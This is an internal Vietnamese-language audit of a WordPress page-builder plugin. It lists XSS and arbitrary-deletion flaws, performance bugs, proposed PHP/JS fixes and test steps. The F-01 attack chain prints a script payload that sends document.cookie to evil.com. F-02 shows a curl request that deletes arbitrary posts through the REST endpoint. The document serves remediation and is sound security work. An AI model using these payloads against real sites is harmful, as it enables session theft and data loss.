# 🔧 Important Fix — Align Visual Builder: Bugs & Security Issues

> [!CAUTION]
> Tài liệu này tổng hợp **danh sách các lỗi và lỗ hổng bảo mật đang tồn đọng** qua quá trình audit sâu pipeline xử lý của Align Visual Builder — bao gồm shortcode engine, CRUD handler, REST API, reusable block override system, và inspector panel. Mỗi issue đều có **nguyên nhân gốc rễ, đoạn code fix đề xuất và cách test xác minh**.

---

## Danh sách nhanh các issue cần xử lý

| # | Loại | Severity | File chính | Trạng thái |
|---|------|----------|-----------|-----------|
| [F-01](#f-01) | 🔒 Security | 🔴 High | `class-align-reusable-block.php` | Cần fix |
| [F-02](#f-02) | 🔒 Security | 🔴 High | `class-builder-crud-handler.php` | Cần fix |
| [F-03](#f-03) | 🐛 Bug | 🟠 Medium | `class-builder-rest-api.php` | Cần fix |
| [F-04](#f-04) | ⚡ Perf | 🟠 Medium | `wp-style-injector.js` | Cần fix |
| [F-05](#f-05) | 🐛 Bug | 🟡 Low | `builder-drag-drop.js` | Fix nhanh |
| [F-06](#f-06) | ⚡ Perf | 🟡 Low | `builder-drag-drop.js` + `wp-save-handler.js` | Fix nhanh |

> [!NOTE]
> **Các issue đã hoàn thành trong đợt kiểm tra trước**:
> - ✅ **CSRF Nonce Check trong `class-builder-rest-api.php`**: Đã bắt buộc xác thực nonce hợp lệ (`wp_verify_nonce($nonce, 'wp_rest')`), từ chối toàn bộ request không có nonce.
> - ✅ **DOM Sanitization Fallback trong `wp-save-handler.js`**: Đã loại bỏ hoàn toàn regex fallback cắt chuỗi không an toàn, chuyển 100% sang `AlignSerializer` & DOMParser.

---

## F-01

### 🔴 [Security] DOM XSS → Frontend XSS qua Content Overwrite text field

**Root cause:** Inspector panel ghi `el.innerHTML = value` trực tiếp từ input của user. Khi save, PHP `appendXML()` nhận raw content mà không sanitize → `<script>` tag render trên public page.

**Files liên quan:**
- `core/builder/js/modules/reuse-block/reuse-block-inspector-live.js` (line 244, 284)
- `core/builder/js/modules/reuse-block/reuse-block-inspector-api.js` (line 180)
- `core/includes/core/class-align-reusable-block.php` (line ~208)

**Attack chain:**
```
User gõ vào text/link field:
  <script>fetch('https://evil.com?c='+document.cookie)</script>

→ el.innerHTML = this.value                      [inspector-live.js:284]
→ triggerCanvasChange() → _alignActiveReuseOverrides[blockId][ovId] = {content: "<script>..."}
→ Save button → POST reusable_overrides (JSON)
→ PHP: update_post_meta($post_id, '_align_reusable_overrides', [...])
→ Frontend render: apply_reusable_overrides()
    → $frag->appendXML($ov_data['content'])       [line 208] — THÀNH CÔNG vì valid XML
    → $node->appendChild($frag)
    → $dom->saveHTML() → <script> trong output HTML
    → Public visitor thấy page với XSS payload
```

**Fix — PHP `class-align-reusable-block.php`, hàm `apply_reusable_overrides`, line ~208:**

```php
// TRƯỚC:
if ( @$frag->appendXML( $ov_data['content'] ) ) {
    $node->appendChild( $frag );
} else {
    $node->nodeValue = esc_html( $ov_data['content'] );
}

// SAU:
$safe_content = wp_kses_post( $ov_data['content'] );
if ( @$frag->appendXML( $safe_content ) ) {
    $node->appendChild( $frag );
} else {
    $node->nodeValue = esc_html( $ov_data['content'] );
}
```

**Fix bổ sung — `class-builder-crud-handler.php`, hàm `save_page`, line ~150:**

```php
// TRƯỚC:
if ( is_array( $reusable_overrides ) ) {
    update_post_meta( $post_id, '_align_reusable_overrides', $reusable_overrides );
}

// SAU: Sanitize trước khi lưu
if ( is_array( $reusable_overrides ) ) {
    array_walk_recursive( $reusable_overrides, function( &$val, $key ) {
        if ( $key === 'content' ) {
            $val = wp_kses_post( $val );
        } elseif ( $key === 'href' || $key === 'src' ) {
            $val = esc_url_raw( $val );
        }
    } );
    update_post_meta( $post_id, '_align_reusable_overrides', $reusable_overrides );
}
```

**Cách test:**

```
REPRODUCE (trước fix):
1. Vào builder, mở page có reusable block với overwritable field
2. Content Overwrite panel → text field → nhập: <b>bold</b>
3. Click Save
4. Mở page đó trên frontend → inspect DOM → có <b> tag = bug confirmed
5. Test với: <script>document.title='XSS'</script>
6. Reload public page → tiêu đề browser đổi = XSS confirmed

VERIFY (sau fix):
1. Nhập payload: <script>document.title='XSS'</script> → Save → public page
2. Tiêu đề KHÔNG đổi
3. Inspect HTML → payload bị stripped hoặc escaped
4. <b>bold</b> → vẫn hiển thị bold (wp_kses_post giữ thẻ b)
5. <img src="/wp-content/x.jpg"> → vẫn hiển thị
6. <iframe src="javascript:alert(1)"> → bị stripped
```

---

## F-02

### 🔴 [Security] `delete_item` không kiểm tra post type → xóa arbitrary post

**Root cause:** `delete_item()` nhận `post_id` và gọi `wp_delete_post()` ngay mà không verify post type có thuộc builder domain không.

**File:** `core/inc/builder/class-builder-crud-handler.php` (line 373-383)

**Attack simulation:**
```
POST /wp-json/align-builder/v1/delete-item
Headers: X-WP-Nonce: [valid nonce]
Body: {"post_id": 9999}  ← post_id của WooCommerce order, product, v.v.

→ check_permission(): current_user_can('edit_pages') = true
→ delete_item(): wp_delete_post(9999, true) → XÓA BẤT KỲ POST!
```

**Fix — thêm vào đầu block `if ($post_id)` trong `delete_item()`:**

```php
if ( $post_id ) {
    // THÊM: Validate post type và ownership
    $post = get_post( $post_id );
    if ( ! $post ) {
        return new WP_Error( 'not_found', __( 'Post not found.', 'align' ), array( 'status' => 404 ) );
    }
    $allowed_post_types = array( 'page', 'wp_template', 'wp_template_part', 'wp_block' );
    if ( ! in_array( $post->post_type, $allowed_post_types, true ) ) {
        return new WP_Error( 'invalid_type', __( 'Cannot delete this post type via Builder.', 'align' ), array( 'status' => 403 ) );
    }
    if ( ! current_user_can( 'delete_post', $post_id ) ) {
        return new WP_Error( 'forbidden', __( 'You do not have permission to delete this item.', 'align' ), array( 'status' => 403 ) );
    }

    $deleted = wp_delete_post( $post_id, true );
    // ... rest of existing code ...
```

**Cách test:**

```
REPRODUCE (trước fix):
1. Lấy ID của một post type tùy ý (vd: 'post' type), giả sử ID = 50
2. Dùng curl hoặc Insomnia:
   curl -X POST https://yourdomain.com/wp-json/align-builder/v1/delete-item \
     -H "Content-Type: application/json" \
     -H "X-WP-Nonce: YOUR_NONCE" \
     -d '{"post_id": 50}'
3. Response {"status":"success"} + post bị xóa = bug confirmed

VERIFY (sau fix):
1. Repeat với post_id là 'post' type → 403 {"code":"invalid_type"}
2. Repeat với post_id là 'page' type → vẫn xóa được bình thường
3. Repeat với post_id là 'wp_block' → vẫn xóa được
4. Repeat với post_id không tồn tại → 404 response

Lấy NONCE từ builder page (DevTools Console):
  window.VvvebWpConfig.restNonce
```

---

## F-03

### 🟠 [Bug] `api_get_page_content()` thiếu `return`

**Root cause:** Backward-compat proxy quên `return`.

**File:** `core/inc/builder/class-builder-rest-api.php` (line 64-66)

```php
// TRƯỚC:
public function api_get_page_content( $request ) {
    Align_Builder_Content_Handler::get_page_content( $request );
}

// SAU:
public function api_get_page_content( $request ) {
    return Align_Builder_Content_Handler::get_page_content( $request );
}
```

**Cách test:**

```
TEST (thêm tạm vào wp-config.php hoặc functions.php):
add_action('wp_footer', function() {
    if (!current_user_can('manage_options') || !isset($_GET['test_proxy'])) return;
    $api = new Align_Builder_Rest_Api();
    $req = new WP_REST_Request('GET');
    $req->set_param('id', 1);
    $result = $api->api_get_page_content($req);

    echo '<pre>Type: ' . gettype($result) . "\n";
    echo 'Value: ' . var_export($result, true) . '</pre>';
    // Trước fix: Type: NULL
    // Sau fix:   Type: object (WP_REST_Response)
});
// Truy cập: /?test_proxy=1
```

---

## F-04

### 🟠 [Performance] MutationObserver trong WpStyleInjector gây render storm

**Root cause:** Observer với `subtree: true` fire trên mọi DOM change. `replaceDummyImagesInIframe()` modify DOM → trigger thêm mutations → loop.

**File:** `core/builder/js/modules/wp-style-injector.js` (line 33-43)

```js
// TRƯỚC:
const observer = new MutationObserver(function() {
    if (window.Vvveb && window.Vvveb.Builder && window.Vvveb.Builder.isDragging) return;
    window.AlignBuilderModules.WpStyleInjector.replaceDummyImagesInIframe();
});
observer.observe(frameDoc.body, { childList: true, subtree: true });

// SAU:
let _imgReplaceTimer = null;
const observer = new MutationObserver(function() {
    if (window.Vvveb && window.Vvveb.Builder && window.Vvveb.Builder.isDragging) return;
    clearTimeout(_imgReplaceTimer);
    _imgReplaceTimer = setTimeout(function() {
        observer.disconnect();
        window.AlignBuilderModules.WpStyleInjector.replaceDummyImagesInIframe();
        requestAnimationFrame(function() {
            if (frameDoc && frameDoc.body) {
                observer.observe(frameDoc.body, { childList: true, subtree: true });
            }
        });
    }, 150);
});
observer.observe(frameDoc.body, { childList: true, subtree: true });
```

**Cách test:**

```
ĐO TRƯỚC fix (DevTools Console trong builder):
let callCount = 0;
const orig = window.AlignBuilderModules.WpStyleInjector.replaceDummyImagesInIframe.bind(
    window.AlignBuilderModules.WpStyleInjector
);
window.AlignBuilderModules.WpStyleInjector.replaceDummyImagesInIframe = function() {
    console.log('Call #' + (++callCount));
    return orig();
};
// Sau đó drag một component → đếm số log
// Trước fix: thường 10-50+ calls per drag
// Sau fix: 1-2 calls per drag

Đo Performance:
1. DevTools → Performance → Start Recording
2. Drag component vào canvas
3. Stop → xem số lần fire của replaceDummyImagesInIframe
```

---

## F-05

### 🟡 [Bug] `saveElement()` guard check sai variable name

**File:** `core/builder/libs/builder/engine/builder-drag-drop.js` (line 356)

```js
// TRƯỚC:
if (typeof saveUrl != "undefined") {
    fetch(saveReusableUrl, ...)  // ← Dùng saveReusableUrl nhưng guard check saveUrl!

// SAU:
if (typeof saveReusableUrl != "undefined") {
    fetch(saveReusableUrl, ...)
```

**Cách test:**

```
Console test:
// Simulate bug:
var saveUrl = 'defined';
// saveReusableUrl chưa define

try {
    if (typeof saveUrl != "undefined") {
        console.log(saveReusableUrl); // ReferenceError!
    }
} catch(e) { console.error('Bug:', e.message); }
// → "Bug: saveReusableUrl is not defined"

// Verify fix:
try {
    if (typeof saveReusableUrl != "undefined") {
        // Không vào đây → an toàn
    }
    console.log('OK - guard works');
} catch(e) { console.error('Still broken'); }
```

---

## F-06

### 🟡 [Performance] Double URL normalization khi save

**Files:** `builder-drag-drop.js:236` và `wp-save-handler.js:368`

```js
// Cả hai đều có:
html.replace(/https?:\/\/[^\s'"<>]+\/wp-content\//gi, '/wp-content/');
```

**Fix** — Xóa dòng normalization trong `builder-drag-drop.js:236` (giữ lại ở `wp-save-handler.js`):

```js
// builder-drag-drop.js, hàm getHtml() — XÓA dòng này:
// html = html.replace(/https?:\/\/[^\s'"<>]+\/wp-content\//gi, '/wp-content/');
```

**Cách test:**

```
1. Thêm image với URL: https://yourdomain.com/wp-content/uploads/test.jpg
2. Click Save
3. Check DB (wp-admin → Posts → Edit → Text mode)
4. URL phải là: /wp-content/uploads/test.jpg (relative, normalize 1 lần)
5. Verify không bị double-encode hay broken URL
```

---

## Thứ tự fix được đề xuất

```
Sprint 1 — Critical (ưu tiên ngay):
  [ ] F-01a: wp_kses_post() trong apply_reusable_overrides()    ~10 phút
  [ ] F-01b: array_walk_recursive sanitize trong save_page()    ~5 phút
  [ ] F-02:  Post type + ownership check trong delete_item()     ~15 phút

Sprint 2 — Medium (trong tuần):
  [ ] F-03:  Thêm return vào api_get_page_content()              ~1 phút
  [ ] F-04:  Debounce MutationObserver WpStyleInjector           ~15 phút

Sprint 3 — Low (khi tiện):
  [ ] F-05:  Sửa guard saveReusableUrl                           ~1 phút
  [ ] F-06:  Xóa redundant URL normalization trong getHtml()     ~1 phút
```

---

*Updated: 2026-08-17 | Audit scope: Builder pipeline, REST API, Inspector Panel, Reusable Override System*
